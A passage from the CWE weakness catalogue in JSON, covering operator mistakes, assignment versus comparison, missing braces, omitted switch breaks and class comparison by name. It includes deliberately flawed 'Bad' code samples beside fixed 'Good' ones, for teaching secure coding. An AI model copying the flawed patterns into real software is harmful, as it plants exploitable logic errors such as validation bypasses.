              "ExampleCode": "module csr_regfile #(\n ...\n\n```\n\t // check that we actually want to enter debug depending on the privilege level we are currently in\n\t unique case (priv_lvl_o)\n\t\t riscv::PRIV_LVL_M: begin\n\t\t\t debug_mode_d = dcsr_q.ebreakm;\n ...\n\t\t riscv::PRIV_LVL_U: begin\n\t\t\t debug_mode_d = dcsr_q.ebreaku;\n ...\n\t assign priv_lvl_o = \n```\n(debug_mode_q && umode_i) ? riscv::PRIV_LVL_M : priv_lvl_q;** \n\t ...\n\n```\n\t debug_mode_q <= debug_mode_d;\n ...\n```"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2022-3979",
          "Description": "Chain: data visualization program written in PHP uses the \"!=\" operator instead of the type-strict \"!==\" operator (CWE-480) when validating hash values, potentially leading to an incorrect type conversion (CWE-704)",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-3979"
        },
        {
          "Reference": "CVE-2021-3116",
          "Description": "Chain: Python-based HTTP Proxy server uses the wrong boolean operators (CWE-480) causing an incorrect comparison (CWE-697) that identifies an authN failure if all three conditions are met instead of only one, allowing bypass of the proxy authentication (CWE-1390)",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2021-3116"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CLASP",
          "EntryName": "Using the wrong operator"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "EXP45-C",
          "EntryName": "Do not perform assignments in selection statements",
          "MappingFit": "CWE More Abstract"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "EXP46-C",
          "EntryName": "Do not use a bitwise operator with a Boolean-like operand",
          "MappingFit": "CWE More Abstract"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP1",
          "EntryName": "Glitch in Computation"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-18",
          "Authors": [
            "Secure Software, Inc."
          ],
          "Title": "The CLASP Application Security Process",
          "PublicationYear": "2005",
          "URL": "https://cwe.mitre.org/documents/sources/TheCLASPApplicationSecurityProcess.pdf"
        },
        {
          "ExternalReferenceID": "REF-62",
          "Section": "Chapter 6, \"Typos\", Page 289",
          "Authors": [
            "Mark Dowd",
            "John McDonald",
            "Justin Schuh"
          ],
          "Title": "The Art of Software Security Assessment",
          "Edition": "1st Edition",
          "PublicationYear": "2006",
          "Publisher": "Addison Wesley"
        },
        {
          "ExternalReferenceID": "REF-1377",
          "Title": "csr_regile.sv line 938",
          "PublicationYear": "2021",
          "URL": "https://github.com/HACK-EVENT/hackatdac19/blob/57e7b2109c1ea2451914878df2e6ca740c2dcf34/src/csr_regfile.sv#L938",
          "URLDate": "2023-12-13"
        },
        {
          "ExternalReferenceID": "REF-1378",
          "Title": "Fix for csr_regfile.sv line 938",
          "PublicationYear": "2021",
          "URL": "https://github.com/HACK-EVENT/hackatdac19/blob/a7b61209e56c48eec585eeedea8413997ec71e4a/src/csr_regfile.sv#L938C31-L938C56",
          "URLDate": "2023-12-13"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "481",
      "Name": "Assigning instead of Comparing",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The code uses an operator for assignment when the intention was to perform a comparison.",
      "ExtendedDescription": "In many languages the compare statement is very close in appearance to the assignment statement and are often confused. This bug is generally the result of a typo and usually causes obvious problems with program execution. If the comparison is in an if statement, the if statement will usually evaluate the value of the right-hand side of the predicate.",
      "LikelihoodOfExploit": "Low",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "480",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "697",
          "ViewID": "1000"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "C",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "C++",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "Java",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "C#",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Alter Execution Logic"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Testing"
          ],
          "Description": "Many IDEs and static analysis products will detect this problem."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Place constants on the left. If one attempts to assign a constant with a variable, the compiler will produce an error."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-140",
          "Entries": [
            {
              "IntroText": "The following C/C++ and C# examples attempt to validate an int input parameter against the integer value 100."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tint isValid(int value) {\n\t\tif (value=100) {\n\t\t\tprintf(\"Value is valid\\n\");\n\t\t\treturn(1);\n\t\t}\n\t\tprintf(\"Value is not valid\\n\");\n\t\treturn(0);\n\t}\n```"
            },
            {
              "Nature": "Bad",
              "Language": "C#",
              "ExampleCode": "```\n\tbool isValid(int value) {\n\t\tif (value=100) {\n\t\t\tConsole.WriteLine(\"Value is valid.\");\n\t\t\treturn true;\n\t\t}\n\t\tConsole.WriteLine(\"Value is not valid.\");\n\t\treturn false;\n\t}\n```"
            },
            {
              "BodyText": "However, the expression to be evaluated in the if statement uses the assignment operator \"=\" rather than the comparison operator \"==\". The result of using the assignment operator instead of the comparison operator causes the int variable to be reassigned locally and the expression in the if statement will always evaluate to the value on the right hand side of the expression. This will result in the input value not being properly validated, which can cause unexpected results."
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "In this example, we show how assigning instead of comparing can impact code when values are being passed by reference instead of by value. Consider a scenario in which a string is being processed from user input. Assume the string has already been formatted such that different user inputs are concatenated with the colon character. When the processString function is called, the test for the colon character will result in an insertion of the colon character instead, adding new input separators. Since the string was passed by reference, the data sentinels will be inserted in the original string (CWE-464), and further processing of the inputs will be altered, possibly malformed.."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tvoid processString (char *str) {\n\t\t\tint i;\n\t\t\tfor(i=0; i<strlen(str); i++) {\n\t\t\t\tif (isalnum(str[i])){\n\t\t\t\t\tprocessChar(str[i]);\n\t\t\t\t}\n\t\t\t\telse if (str[i] = ':') {\n\t\t\t\t\tmovingToNewInput();}\n\t\t\t\t}\n\t\t\t}\n\t}\n```"
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "The following Java example attempts to perform some processing based on the boolean value of the input parameter. However, the expression to be evaluated in the if statement uses the assignment operator \"=\" rather than the comparison operator \"==\". As with the previous examples, the variable will be reassigned locally and the expression in the if statement will evaluate to true and unintended processing may occur."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic void checkValid(boolean isValid) {\n\t\tif (isValid = true) {\n\t\t\tSystem.out.println(\"Performing processing\");\n\t\t\tdoSomethingImportant();\n\t\t}\n\t\telse {\n\t\t\tSystem.out.println(\"Not Valid, do not perform processing\");\n\t\t\treturn;\n\t\t}\n\t}\n```"
            },
            {
              "BodyText": "While most Java compilers will catch the use of an assignment operator when a comparison operator is required, for boolean variables in Java the use of the assignment operator within an expression is allowed. If possible, try to avoid using comparison operators on boolean variables in java. Instead, let the values of the variables stand for themselves, as in the following code."
            },
            {
              "Nature": "Good",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic void checkValid(boolean isValid) {\n\t\tif (isValid) {\n\t\t\tSystem.out.println(\"Performing processing\");\n\t\t\tdoSomethingImportant();\n\t\t}\n\t\telse {\n\t\t\tSystem.out.println(\"Not Valid, do not perform processing\");\n\t\t\treturn;\n\t\t}\n\t}\n```"
            },
            {
              "BodyText": "Alternatively, to test for false, just use the boolean NOT operator."
            },
            {
              "Nature": "Good",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic void checkValid(boolean isValid) {\n\t\tif (!isValid) {\n\t\t\tSystem.out.println(\"Not Valid, do not perform processing\");\n\t\t\treturn;\n\t\t}\n\t\tSystem.out.println(\"Performing processing\");\n\t\tdoSomethingImportant();\n\t}\n```"
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "The following example demonstrates the weakness."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tvoid called(int foo){\n\t\tif (foo=1) printf(\"foo\\n\");\n\t}\n\tint main() {\n\t\t\tcalled(2);\n\t\t\treturn 0;\n\t}\n```"
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CLASP",
          "EntryName": "Assigning instead of comparing"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP1",
          "EntryName": "Glitch in computation"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "EXP45-C",
          "EntryName": "Do not perform assignments in selection statements",
          "MappingFit": "CWE More Abstract"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-18",
          "Authors": [
            "Secure Software, Inc."
          ],
          "Title": "The CLASP Application Security Process",
          "PublicationYear": "2005",
          "URL": "https://cwe.mitre.org/documents/sources/TheCLASPApplicationSecurityProcess.pdf"
        },
        {
          "ExternalReferenceID": "REF-62",
          "Section": "Chapter 6, \"Typos\", Page 289",
          "Authors": [
            "Mark Dowd",
            "John McDonald",
            "Justin Schuh"
          ],
          "Title": "The Art of Software Security Assessment",
          "Edition": "1st Edition",
          "PublicationYear": "2006",
          "Publisher": "Addison Wesley"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "482",
      "Name": "Comparing instead of Assigning",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The code uses an operator for comparison when the intention was to perform an assignment.",
      "ExtendedDescription": "In many languages, the compare statement is very close in appearance to the assignment statement; they are often confused.",
      "LikelihoodOfExploit": "Low",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "480",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "C",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "C++",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation",
          "Note": "This bug primarily originates from a typo."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Availability",
            "Integrity"
          ],
          "Impact": [
            "Unexpected State"
          ],
          "Note": "The assignment will not take place, which should cause obvious program execution problems."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Testing"
          ],
          "Description": "Many IDEs and static analysis products will detect this problem."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "The following example demonstrates the weakness."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tvoid called(int foo) {\n\t\tfoo==1;\n\t\tif (foo==1) System.out.println(\"foo\\n\");\n\t}\n\tint main() {\n\t\t\tcalled(2);\n\t\t\treturn 0;\n\t}\n```"
            }
          ]
        },
        {
          "ID": "DX-103",
          "Entries": [
            {
              "IntroText": "The following C/C++ example shows a simple implementation of a stack that includes methods for adding and removing integer values from the stack. The example uses pointers to add and remove integer values to the stack array variable."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\t#define SIZE 50\n\tint *tos, *p1, stack[SIZE];\n\tvoid push(int i) {\n\t\t\tp1++;\n\t\t\tif(p1==(tos+SIZE)) {\n```\n// Print stack overflow error message and exit* \n\t\t\t\t\t}\n\t\t\t*p1 == i;}\n\t\n\tint pop(void) {\n\t```\n\t\t\tif(p1==tos) {\n```\n// Print stack underflow error message and exit* \n\t\t\t\t\t}\n\t\t\tp1--;\n\t\t\treturn *(p1+1);}\n\t\n\tint main(int argc, char *argv[]) {\n\t```\n```\n// initialize tos and p1 to point to the top of stack* \n\t\t\ttos = stack;\n\t\t\tp1 = stack;\n\t\t\t\n\t\t\t *// code to add and remove items from stack* \n\t\t\t...\n\t\t\treturn 0;}"
            },
            {
              "BodyText": "The push method includes an expression to assign the integer value to the location in the stack pointed to by the pointer variable."
            },
            {
              "BodyText": "However, this expression uses the comparison operator \"==\" rather than the assignment operator \"=\". The result of using the comparison operator instead of the assignment operator causes erroneous values to be entered into the stack and can cause unexpected results."
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CLASP",
          "EntryName": "Comparing instead of assigning"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP2",
          "EntryName": "Unused Entities"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-18",
          "Authors": [
            "Secure Software, Inc."
          ],
          "Title": "The CLASP Application Security Process",
          "PublicationYear": "2005",
          "URL": "https://cwe.mitre.org/documents/sources/TheCLASPApplicationSecurityProcess.pdf"
        },
        {
          "ExternalReferenceID": "REF-62",
          "Section": "Chapter 6, \"Typos\", Page 289",
          "Authors": [
            "Mark Dowd",
            "John McDonald",
            "Justin Schuh"
          ],
          "Title": "The Art of Software Security Assessment",
          "Edition": "1st Edition",
          "PublicationYear": "2006",
          "Publisher": "Addison Wesley"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "483",
      "Name": "Incorrect Block Delimitation",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The code does not explicitly delimit a block that is intended to contain 2 or more statements, creating a logic error.",
      "ExtendedDescription": "In some languages, braces (or other delimiters) are optional for blocks. When the delimiter is omitted, it is possible to insert a logic error in which a statement is thought to be in a block but is not. In some cases, the logic error can have security implications.",
      "LikelihoodOfExploit": "Low",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "670",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        },
        {
          "Ordinality": "Indirect"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "C",
          "Prevalence": "Sometimes"
        },
        {
          "Type": "Language",
          "Name": "C++",
          "Prevalence": "Sometimes"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality",
            "Integrity",
            "Availability"
          ],
          "Impact": [
            "Alter Execution Logic"
          ],
          "Note": "This is a general logic error which will often lead to obviously-incorrect behaviors that are quickly noticed and fixed. In lightly tested or untested code, this error may be introduced it into a production environment and provide additional attack vectors by creating a control flow path leading to an unexpected state in the application. The consequences will depend on the types of behaviors that are being incorrectly executed."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Always use explicit block delimitation and use static-analysis technologies to enforce this practice."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-181",
          "Entries": [
            {
              "IntroText": "In this example, the programmer has indented the statements to call Do_X() and Do_Y(), as if the intention is that these functions are only called when the condition is true. However, because there are no braces to signify the block, Do_Y() will always be executed, even if the condition is false."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tif (condition==true)\n\t\tDo_X();\n\t\tDo_Y();\n```"
            },
            {
              "BodyText": "This might not be what the programmer intended. When the condition is critical for security, such as in making a security decision or detecting a critical error, this may produce a vulnerability."
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "In this example, the programmer has indented the Do_Y() statement as if the intention is that the function should be associated with the preceding conditional and should only be called when the condition is true. However, because Do_X() was called on the same line as the conditional and there are no braces to signify the block, Do_Y() will always be executed, even if the condition is false."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tif (condition==true) Do_X();\n\t\tDo_Y();\n```"
            },
            {
              "BodyText": "This might not be what the programmer intended. When the condition is critical for security, such as in making a security decision or detecting a critical error, this may produce a vulnerability."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2014-1266",
          "Description": "incorrect indentation of \"goto\" statement makes it more difficult to detect an incorrect goto (Apple's \"goto fail\")",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2014-1266"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CLASP",
          "EntryName": "Incorrect block delimitation"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-18",
          "Authors": [
            "Secure Software, Inc."
          ],
          "Title": "The CLASP Application Security Process",
          "PublicationYear": "2005",
          "URL": "https://cwe.mitre.org/documents/sources/TheCLASPApplicationSecurityProcess.pdf"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "484",
      "Name": "Omitted Break Statement in Switch",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product omits a break statement within a switch or similar construct, causing code associated with multiple conditions to execute. This can cause problems when the programmer only intended to execute code associated with one condition.",
      "ExtendedDescription": "This can lead to critical code executing in situations where it should not.",
      "LikelihoodOfExploit": "Medium",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "710",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "670",
          "ViewID": "1000"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        },
        {
          "Ordinality": "Indirect"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "C",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "C++",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "Java",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "C#",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "PHP",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Alter Execution Logic"
          ],
          "Note": "This weakness can cause unintended logic to be executed and other unexpected application behavior."
        }
      ],
      "DetectionMethods": [
        {
          "Method": "White Box",
          "Description": "Omission of a break statement might be intentional, in order to support fallthrough. Automated detection methods might therefore be erroneous. Semantic understanding of expected product behavior is required to interpret whether the code is correct."
        },
        {
          "Method": "Black Box",
          "Description": "Since this weakness is associated with a code construct, it would be indistinguishable from other errors that produce the same behavior."
        },
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Omitting a break statement so that one may fall through is often indistinguishable from an error, and therefore should be avoided. If you need to use fall-through capabilities, make sure that you have clearly documented this within the switch statement, and ensure that you have examined all the logical possibilities."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "The functionality of omitting a break statement could be clarified with an if statement. This method is much safer."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-182",
          "Entries": [
            {
              "IntroText": "In both of these examples, a message is printed based on the month passed into the function:"
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic void printMessage(int month){\n\t\t\tswitch (month) {\n\t\t\t\t\tcase 1: print(\"January\");\n\t\t\t\t\tcase 2: print(\"February\");\n\t\t\t\t\tcase 3: print(\"March\");\n\t\t\t\t\tcase 4: print(\"April\");\n\t\t\t\t\tcase 5: print(\"May\");\n\t\t\t\t\tcase 6: print(\"June\");\n\t\t\t\t\tcase 7: print(\"July\");\n\t\t\t\t\tcase 8: print(\"August\");\n\t\t\t\t\tcase 9: print(\"September\");\n\t\t\t\t\tcase 10: print(\"October\");\n\t\t\t\t\tcase 11: print(\"November\");\n\t\t\t\t\tcase 12: print(\"December\");\n\t\t\t}\n\t\t\tprintln(\" is a great month\");\n\t}\n```"
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tvoid printMessage(int month){\n\t\t\tswitch (month) {\n\t\t\t\t\tcase 1: printf(\"January\");\n\t\t\t\t\tcase 2: printf(\"February\");\n\t\t\t\t\tcase 3: printf(\"March\");\n\t\t\t\t\tcase 4: printf(\"April\");\n\t\t\t\t\tcase 5: printff(\"May\");\n\t\t\t\t\tcase 6: printf(\"June\");\n\t\t\t\t\tcase 7: printf(\"July\");\n\t\t\t\t\tcase 8: printf(\"August\");\n\t\t\t\t\tcase 9: printf(\"September\");\n\t\t\t\t\tcase 10: printf(\"October\");\n\t\t\t\t\tcase 11: printf(\"November\");\n\t\t\t\t\tcase 12: printf(\"December\");\n\t\t\t}\n\t\t\tprintf(\" is a great month\");\n\t}\n```"
            },
            {
              "BodyText": "Both examples do not use a break statement after each case, which leads to unintended fall-through behavior. For example, calling \"printMessage(10)\" will result in the text \"OctoberNovemberDecember is a great month\" being printed."
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CLASP",
          "EntryName": "Omitted break statement"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP4",
          "EntryName": "Unchecked Status Condition"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-18",
          "Authors": [
            "Secure Software, Inc."
          ],
          "Title": "The CLASP Application Security Process",
          "PublicationYear": "2005",
          "URL": "https://cwe.mitre.org/documents/sources/TheCLASPApplicationSecurityProcess.pdf"
        },
        {
          "ExternalReferenceID": "REF-62",
          "Section": "Chapter 7, \"Switch Statements\", Page 337",
          "Authors": [
            "Mark Dowd",
            "John McDonald",
            "Justin Schuh"
          ],
          "Title": "The Art of Software Security Assessment",
          "Edition": "1st Edition",
          "PublicationYear": "2006",
          "Publisher": "Addison Wesley"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "486",
      "Name": "Comparison of Classes by Name",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product compares classes by name, which can cause it to use the wrong class when multiple classes can have the same name.",
      "ExtendedDescription": "If the decision to trust the methods and data of an object is based on the name of a class, it is possible for malicious users to send objects of the same name as trusted classes and thereby gain the trust afforded to known classes and types.",
      "LikelihoodOfExploit": "High",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1025",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "Java",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity",
            "Confidentiality",
            "Availability"
          ],
          "Impact": [
            "Execute Unauthorized Code or Commands"
          ],
          "Note": "If a product relies solely on the name of an object to determine identity, it may execute the incorrect or unintended code."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Use class equivalency to determine type. Rather than use the class name to determine if an object is of a given type, use the getClass() method, and == operator."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "In this example, the expression in the if statement compares the class of the inputClass object to a trusted class by comparing the class names."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tif (inputClass.getClass().getName().equals(\"TrustedClassName\")) {\n```\n// Do something assuming you trust inputClass* \n\t\t\t\n\t\t\t\n\t\t\t *// ...* \n\t\t\t}"
            },
            {
              "BodyText": "However, multiple classes can have the same name therefore comparing an object's class by name can allow untrusted classes of the same name as the trusted class to be use to execute unintended or incorrect code. To compare the class of an object to the intended class the getClass() method and the comparison operator \"==\" should be used to ensure the correct trusted class is used, as shown in the following example."
            },
            {
              "Nature": "Good",
              "Language": "Java",
              "ExampleCode": "```\n\tif (inputClass.getClass() == TrustedClass.class) {\n```\n// Do something assuming you trust inputClass* \n\t\t\t\n\t\t\t\n\t\t\t *// ...* \n\t\t\t}"
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "In this example, the Java class, TrustedClass, overrides the equals method of the parent class Object to determine equivalence of objects of the class. The overridden equals method first determines if the object, obj, is the same class as the TrustedClass object and then compares the object's fields to determine if the objects are equivalent."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic class TrustedClass {\n\t\t\t...\n\t\t\t@Override\n\t\t\tpublic boolean equals(Object obj) {\n\t\t\t\t\tboolean isEquals = false;\n```\n// first check to see if the object is of the same class* \n\t\t\t\t\tif (obj.getClass().getName().equals(this.getClass().getName())) {\n\t\t\t\t\t```\n```\n// then compare object fields* \n\t\t\t\t\t\t\t...\n\t\t\t\t\t\t\tif (...) {\n\t\t\t\t\t\t\t```\n\t\t\t\t\t\t\t\tisEquals = true;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\treturn isEquals;\n\t\t\t}\n\t\t\t...\n\t}\n```"
            },
            {
              "BodyText": "However, the equals method compares the class names of the object, obj, and the TrustedClass object to determine if they are the same class. As with the previous example using the name of the class to compare the class of objects can lead to the execution of unintended or incorrect code if the object passed to the equals method is of another class with the same name. To compare the class of an object to the intended class, the getClass() method and the comparison operator \"==\" should be used to ensure the correct trusted class is used, as shown in the following example."
            },
            {
              "Nature": "Good",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic boolean equals(Object obj) {\n\t\t\t...\n```\n// first check to see if the object is of the same class* \n\t\t\tif (obj.getClass() == this.getClass()) {\n\t\t\t```\n\t\t\t\t...\n\t\t\t}\n\t\t\t...\n\t}\n```"
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "7 Pernicious Kingdoms",
          "EntryName": "Comparing Classes by Name"
        },
        {
          "TaxonomyName": "CLASP",
          "EntryName": "Comparing classes by name"
        },
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "OBJ09-J",
